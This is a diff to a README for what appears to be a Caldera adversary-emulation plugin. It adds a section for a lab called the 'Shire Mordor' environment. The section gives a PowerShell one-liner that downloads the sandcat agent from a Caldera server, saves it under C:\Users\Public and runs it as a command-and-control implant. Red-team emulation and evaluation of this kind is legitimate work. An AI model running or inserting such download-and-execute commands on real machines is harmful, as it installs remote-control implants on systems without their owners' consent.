@@ -32,3 +32,11 @@ Minimum requirements:
 ## Execution
 
 Please read the [full documentation](https://github.com/mitre/caldera/wiki/Plugins-evals) for this plugin.
+
+## Shire Mordor Environment Execution
+
+For use within the Shire Mordor environment deploy 54ndc47 using the following PowerShell command: 
+```commandline
+$url="http://172.18.39.8:8888/file/download";$wc=New-Object System.Net.WebClient;$wc.Headers.add("platform","windows");$wc.Headers.add("file","sandcat.go");$output="C:\Users\Public\sandcat.exe";$wc.DownloadFile($url,$output);C:\Users\Public\sandcat.exe -server http://172.18.39.8:8888 -group evals_caldera -v;
+
+```
